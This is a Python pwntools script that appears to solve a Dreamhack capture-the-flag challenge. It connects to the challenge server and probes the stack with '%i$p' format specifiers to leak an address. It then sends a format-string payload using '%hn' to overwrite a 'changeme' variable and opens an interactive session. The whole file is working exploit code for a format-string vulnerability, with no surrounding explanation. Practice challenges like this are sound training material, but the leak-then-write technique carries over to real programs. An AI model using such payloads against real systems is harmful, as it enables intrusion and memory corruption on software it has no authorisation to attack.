from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8964
r = remote(HOST, PORT)

changeme = 0

def find_changeme():
    global changeme
    for i in range(1, 0x20):
        r.sendline(f'%{i}$p'.encode())
        res = r.recvline().decode().strip()
        if res.endswith('d90') and i != 13:
            changeme = int(res, 16) + 0x28c
            break

find_changeme()
payload = b'%1337c%8$hn'
payload += b'\x00' * (8 - (len(payload) % 8))
payload += p64(changeme)

r.sendline(payload)

r.interactive()